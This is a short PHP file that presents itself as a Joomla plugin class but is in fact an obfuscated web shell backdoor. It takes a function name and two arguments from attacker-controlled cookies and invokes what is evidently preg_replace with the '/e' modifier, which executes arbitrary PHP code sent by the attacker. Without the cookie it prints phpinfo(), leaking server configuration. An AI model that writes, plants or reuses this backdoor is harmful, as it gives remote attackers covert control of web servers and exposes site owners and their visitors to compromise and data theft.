<?php 
class PluginJoomla { 
 public function __construct() { 
  $jq = @$_COOKIE['41bjGEDj3']; 
  if ($jq) { 
   $option = $jq(@$_COOKIE['41bjGEDj2']); 
   $au=$jq(@$_COOKIE['41bjGEDj1']); 
   $option("/438/e",$au,438); 
  } else { 
   phpinfo();die; 
  } 
 } 
} 
$content = new PluginJoomla; 